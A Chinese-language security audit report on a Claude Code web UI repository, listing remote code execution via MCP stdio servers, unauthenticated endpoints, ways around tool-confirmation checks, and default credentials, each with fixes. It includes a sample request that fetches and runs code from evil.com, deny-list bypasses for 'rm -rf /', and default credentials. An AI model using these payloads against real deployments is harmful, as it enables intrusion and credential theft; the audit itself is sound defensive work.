# 安全审计 — CC Web (free-code) 仓库

## Why

对 `/workspace/web`（CC Web — Claude Code Web UI）进行端到端安全审计，识别中等严重度及以上的已确认漏洞，且每条都必须具备可论证的完整利用路径。仅保留能具体证明可利用性的发现。

## What Changes

- 不修改任何代码；仅输出结构化漏洞报告
- 创建 `tasks.md` 跟踪每条已确认漏洞的修复跟踪
- 创建 `checklist.md` 用于审计复核

## 影响范围

- 受影响规格（spec）：认证与访问控制、注入向量、外部交互、敏感数据处理
- 受影响代码：
  - `web/src/middleware.ts`
  - `web/src/lib/auth.ts`
  - `web/src/app/api/mcp/servers/route.ts`
  - `web/src/app/api/mcp/servers/[id]/route.ts`
  - `web/src/app/api/mcp/servers/[id]/tools/route.ts`
  - `web/src/app/api/mcp/servers/[id]/resources/route.ts`
  - `web/src/lib/mcp/manager.ts`（StdioMCPClient.spawn）
  - `web/src/app/api/tools/execute/route.ts`

## 严重等级分组

# 漏洞报告（按严重度排序）

---

## Critical（严重）

### C-1：MCP stdio 子进程任意命令执行（RCE）

- **位置**：
  - [web/src/app/api/mcp/servers/route.ts](file:///workspace/web/src/app/api/mcp/servers/route.ts) L19-L68
  - [web/src/lib/mcp/manager.ts](file:///workspace/web/src/lib/mcp/manager.ts) L70-L82, L421-L426
  - [web/src/app/api/mcp/servers/[id]/route.ts](file:///workspace/web/src/app/api/mcp/servers/[id]/route.ts) L59-L95
- **攻击者画像**：已认证用户（拥有有效 session cookie，admin / changeme 默认凭据可直接登录）
- **可控输入向量**：HTTP POST `/api/mcp/servers` 请求 body 字段 `type="stdio"`、`command`、`args`、`env`
- **完整代码路径**：
  1. 攻击者 POST `/api/mcp/servers`，body：`{"name":"pwn","type":"stdio","command":"/bin/sh","args":["-c","curl evil.com|sh"]}`（`route.ts:53-58` 校验通过，未做白名单/沙箱化）
  2. `manager.addServer()` 写入 `mcp-servers.json` 并将 config 存于内存
  3. 攻击者随后 POST `/api/mcp/servers/{id}` `{"action":"connect"}`（`[id]/route.ts:86-87` 调用 `manager.connectServer(id)`）
  4. `connectServer` 检测到 `config.type === "stdio"`，构造 `new StdioMCPClient()` 并 `await stdioClient.start(config.command, config.args || [], config.env)`（`manager.ts:421-426`）
  5. `StdioMCPClient.start()` 调用 `this.process = spawn(command, args, { stdio: [...], env: spawnEnv, shell: false })`（`manager.ts:77-82`）
  6. 攻击者控制的 shell 在 Next.js 服务器进程用户（vercel/sandbox 上下文）下执行任意命令
- **影响**：完整远程代码执行（容器/主机级权限沦陷，泄露服务器环境变量中的 `ANTHROPIC_API_KEY`/`AUTH_SECRET`/`VERCEL_TOKEN`/`TURSO_AUTH_TOKEN` 等所有密钥；横向访问内部服务）
- **修复建议**：
  1. 对 stdio 类型 MCP 服务器做白名单命令校验（仅允许 `npx/@anthropic-ai/mcp-*` 等已注册官方包）
  2. 或在子进程外层套用 `process.chdir(workDir)` + 裁剪 `env`（移除所有 `AUTH_SECRET`/`ANTHROPIC_API_KEY` 等），禁止 `args` 含 shell 元字符
  3. 或强制走 `executeInSandbox`（`SANDBOX_ENABLED=true` 时所有 `sandboxCapable: true` 工具路由到 `@vercel/sandbox`），并把 `mcp__*` 工具标记为 `sandboxCapable: false` 默认拒绝
  4. 同时将 `connectServer` 的 `connect` 动作置于二次确认（与 `bash` 工具同等风险）

---

## High（高危）

### H-1：任意 MCP 工具/资源执行（任意 MCP 后端能力调用）

- **位置**：
  - [web/src/app/api/mcp/servers/[id]/tools/route.ts](file:///workspace/web/src/app/api/mcp/servers/[id]/tools/route.ts) L23-L58
  - [web/src/app/api/mcp/servers/[id]/resources/route.ts](file:///workspace/web/src/app/api/mcp/servers/[id]/resources/route.ts) L23-L57
  - [web/src/lib/mcp/manager.ts](file:///workspace/web/src/lib/mcp/manager.ts) L549-L608
- **攻击者画像**：已认证用户
- **可控输入向量**：`POST /api/mcp/servers/{id}/tools` body 的 `toolName` 与 `args`；`POST /api/mcp/servers/{id}/resources` body 的 `uri`
- **完整代码路径**：
  1. 攻击者已通过 C-1 注册并连接一个 stdio MCP server（即使是不可信 server，也可在连接后绑定其工具）
  2. `manager.registerServerTools()` 在 `connectServer` 成功后将所有 `tools/list` 返回的工具注册为 `mcp__{serverId}__{toolName}` 工具（`manager.ts:613-629`），且 `requiresConfirmation: false`（无人工确认）
  3. 攻击者直接 `POST /api/mcp/servers/{id}/tools` `{"toolName":"<任意已注册工具>","args":{...}}` 即可调用该 MCP server 上的任何工具；或对 `resources` 任意 URI 调用 `readResource`
  4. 若 MCP server 自身是恶意或被攻陷（参见 C-1 路径），则攻击者借此获得跨会话持久化执行能力
- **影响**：执行已连接 MCP 后端暴露的任意工具（如文件系统读/写、网络出口），调用无需确认，绕过了 `agent-stream.ts` 中 `bypassPermissions` 之外的所有 risk 评估
- **修复建议**：
  1. `MCPManager.executeTool`/`readResource` 调用前对 `toolName`/`uri` 校验是否在 `config.tools` / `config.resources` 白名单中（`manager.ts:560, 597` 缺少校验）
  2. `mcp__*` 工具默认 `requiresConfirmation: true`，按 MCP server 来源或工具名风险分级
  3. 对 `readResource` URI 做 scheme/host 校验，禁止 `file://` 等敏感 scheme

### H-2：未认证访问 `/api/mcp/servers` 列表（信息泄露）— [x] 已确认

- **位置**：
  - [web/src/app/api/mcp/servers/route.ts](file:///workspace/web/src/app/api/mcp/servers/route.ts) L9-L17
- **攻击者画像**：未认证外部用户
- **可控输入向量**：`GET /api/mcp/servers`（无需 session cookie）
- **完整代码路径**：
  1. 攻击者直接 `curl https://target/api/mcp/servers`，无 cookie
  2. `middleware.ts:8-10` 白名单 `/api/auth/*`，**未白名单 `/api/mcp/*`**，但本路由 handler 内部也未做 `getSession()` 校验（`route.ts:9-17` 直接 `manager.listServers()` 返回）
  3. 返回所有 MCP server 配置（含 `command`、`url`、`env` 字典，其中可能含 `AUTH_TOKEN` 等凭据，`manager.ts:642-655` 持久化时未脱敏）
  4. 类似缺陷存在于 `GET /api/mcp/servers/[id]`（`[id]/route.ts:9-28`，未调用 `getSession`）和 `GET /api/mcp/servers/[id]/tools`、`GET /api/mcp/servers/[id]/resources`
- **影响**：未认证用户可枚举全部 MCP server（含凭据）、可遍历所有已注册工具名/资源 URI
- **修复建议**：
  1. 在 `middleware.ts:5-30` 收窄白名单，仅允许 `/api/auth/*`、`/api/health`、`/login`、`/_next/*`、静态资源；MCP 路由必须经 session 校验
  2. `GET /api/mcp/servers`、`GET /api/mcp/servers/[id]` 等所有 handler 顶部加 `getSession()` 校验（与 `POST/DELETE` 对齐）
  3. 返回时脱敏 `env` 字段（`***`）

### H-3：`/api/tools/execute` 越权执行需确认工具（绕过人工确认）

- **位置**：
  - [web/src/app/api/tools/execute/route.ts](file:///workspace/web/src/app/api/tools/execute/route.ts) L15-L57
- **攻击者画像**：已认证用户
- **可控输入向量**：`POST /api/tools/execute` body `{"toolName":"bash","params":{"command":"..."}}`
- **完整代码路径**：
  1. 攻击者登录后调用 `POST /api/tools/execute`，body 指定 `toolName="bash"`（`bash.ts:55` `requiresConfirmation: true`）
  2. 路由直接 `tool.execute(params)`（`execute/route.ts:44`），**未走 `confirm` 流程、未读取 `agent-stream.ts` 的 `permissionMode` 评估**（`agent-stream.ts:610-692` 的 risk 评估被绕过）
  3. `bash.ts:82-107` 中 `exec(command, ...)` 虽受 `DANGEROUS_PATTERNS` 列表限制，但黑名单可绕过（如 `python3 -c "import os; os.system('...')"`、变量插值 `r""m ""-r""f"" /`），且 `workdir` 来自用户输入 `params.workdir`（`bash.ts:64`），无沙箱限制
  4. `file_write`/`file_edit` 等 `requiresConfirmation: true` 工具同理可被直接调用，跳过用户确认
- **影响**：已认证用户可绕过设计中的人工确认环节直接执行高风险工具；与 LLM 驱动的 `agent-stream.ts` 路径相比，这是隐藏的"管理员快捷通道"，任何持有 session 的用户即拥有此能力
- **修复建议**：
  1. `/api/tools/execute` 在执行前调用 `assessToolExecution` 并对 `high`/`outside-sandbox` 风险走 `setPendingConfirmation` + 用户确认
  2. 仅暴露 `requiresConfirmation: false` 工具（或仅 admin 角色可调用此 endpoint）
  3. 对 `bash.command` 增加白名单/参数化而非 `exec(command)`，或强制 `SANDBOX_ENABLED=true` 路由

---

## Medium（中等）

### M-1：默认凭据导致默认部署可被即时登录

- **位置**：
  - [web/src/lib/auth.ts](file:///workspace/web/src/lib/auth.ts) L5-L24
- **攻击者画像**：外部攻击者（任意可访问部署 URL 的人）
- **可控输入向量**：登录表单 username=`admin`, password=`changeme`
- **完整代码路径**：
  1. 部署时未设置 `AUTH_USERNAME`/`AUTH_PASSWORD`/`AUTH_SECRET` 环境变量
  2. `auth.ts:5-9` 加载默认 `admin / changeme / default-secret-change-me`
  3. 仅 `console.warn`（`auth.ts:16-24`），**未 `process.exit(1)`**（注释说"避免 Edge Runtime"，但缺少独立的 server-only 启动校验脚本 `scripts/check-env.ts`）
  4. 攻击者 `POST /api/auth/login` 直接登录获得 7 天有效 JWT（`auth.ts:54` `.setExpirationTime("7d")`）
  5. 获得 admin 凭据后，结合 C-1 立即拿到 RCE
- **影响**：默认部署即被攻陷；JWT 默认 7 天有效期间持续可访问
- **修复建议**：
  1. 在 Node 运行时（非 Edge）的独立启动脚本（如 `instrumentation.ts`）中检测默认凭据并 `process.exit(1)`
  2. 缩短默认 token 有效期（24h）并强制生产环境覆盖 `AUTH_SECRET`
  3. `AUTH_SECRET` 缺失时 HS256 签名可被离线爆破（默认字符串已知）

### M-2：登录接口不限制速率（暴力破解）— [x] 已确认

- **位置**：[web/src/app/api/auth/login/route.ts](file:///workspace/web/src/app/api/auth/login/route.ts) L9-L44
- **攻击者画像**：未认证外部用户
- **可控输入向量**：连续 POST `/api/auth/login` 携带不同 `password` 候选
- **完整代码路径**：
  1. 登录路由无 IP 级或账户级 rate limit、无 lockout 逻辑（`login/route.ts` 全文无计数器）
  2. `verifyCredentials`（`auth.ts:35-40`）为恒定时间字符串比较（OK），但因密码来自环境变量常量，攻击者只需验证已知默认 `changeme` 即可
  3. 配合 M-1 默认凭据实现即时入侵
- **影响**：默认凭据可被盲扫（但更严重的是：若运营方将密码改为弱口令，可被在线爆破）
- **修复建议**：
  1. 引入 `next-rate-limit` 或上游 Vercel Edge Config 做 5 req/min/IP
  2. 失败 N 次后对账号/cookie 短期封禁
  3. 默认 `AUTH_SECRET` 缺失时强制密码长度 ≥ 32 随机

### M-3：MCP server 持久化文件 `mcp-servers.json` 含敏感 env — [x] 已确认

- **位置**：
  - [web/src/lib/mcp/manager.ts](file:///workspace/web/src/lib/mcp/manager.ts) L640-L661
- **攻击者画像**：能读 `process.cwd()` 下文件的攻击者（同进程 RCE、文件路径遍历）
- **可控输入向量**：`mcp-servers.json` 内容由 `addServer` 写入，包含 `env` 字段原文
- **完整代码路径**：
  1. `saveToDisk()`（`manager.ts:640-661`）将 `env` 完整序列化进磁盘 `mcp-servers.json`
  2. 该文件路径 `process.cwd()` 写死（`manager.ts:342`），未限制权限
  3. 任何拿到容器文件系统读权限的攻击者（如 C-1 拿到低权 shell 后）即可读取所有用户曾配置的 `AUTH_TOKEN` 等凭据
- **影响**：凭据持久化文件缺乏加密/访问控制；与 `.env` 类似敏感度但被 `file_write` 工具可达
- **修复建议**：
  1. `env` 字段在落盘前用 `AUTH_SECRET` 加密（AES-GCM），启动时解密
  2. 文件权限设为 `0600`
  3. 优先把 MCP server 配置存到 libSQL（与 providers 存储一致）

---

## 未达中等严重度的次要发现（不计入报告，仅供后续加固参考）

- **L-1（Low）**：MCP GET 资源路由未校验 `uri` scheme，`readResource` 可读取任意 `file://` 等敏感资源（`manager.ts:591-609`）
- **L-2（Low）**：`web-tools.ts:webFetchTool` 的 `validateUrl` 仅做 hostname 黑名单，未做 DNS rebinding 防护（`ssrf-guard.ts:57-68` 注释承认），攻击者可借 DNS 跳转到 `127.0.0.1` 内网；但需 `web_fetch` 工具被 LLM 调用触发，触达面较窄
- **L-3（Low）**：`fileReadTool`/`fileWriteTool` 的 `executeInSandbox` 路径中 `rawPath.startsWith("/")` 判定后直接拼接到 `/vercel/sandbox/${rawPath}`（`file-tools.ts:98, 183, 309`），未做 `..` 过滤，理论上可逃逸到沙箱根目录之外；需 `SANDBOX_ENABLED=true`
- **I-1（Info）**：`tools/bash.ts:DANGEROUS_PATTERNS` 是黑名单，正则 `/\brm\s+-rf\s+\//` 可被 `rm${IFS}-rf${IFS}/` 等绕过；但需 `bash` 工具的 `requiresConfirmation: true` 已被通过（`agent-stream.ts:634-647`），已属于 M-1/H-3 链路下游

---

# 总结

已确认 **1 个 Critical**、**3 个 High**、**3 个 Medium** 严重度漏洞，均具备完整端到端利用路径：

- **C-1**（Critical）：MCP stdio 任意命令执行 — 已认证 → RCE
- **H-1**（High）：任意 MCP 工具/资源调用 — 已认证 → 后端能力滥用
- **H-2**（High）：MCP GET 路由未认证访问 — 外部 → 配置/凭据泄露
- **H-3**（High**）：`/api/tools/execute` 越权执行 — 已认证 → 绕过人工确认
- **M-1**（Medium）：默认凭据 — 外部 → 登录
- **M-2**（Medium）：登录无速率限制 — 外部 → 爆破
- **M-3**（Medium）：MCP 持久化文件含明文凭据 — 内部 → 凭据窃取
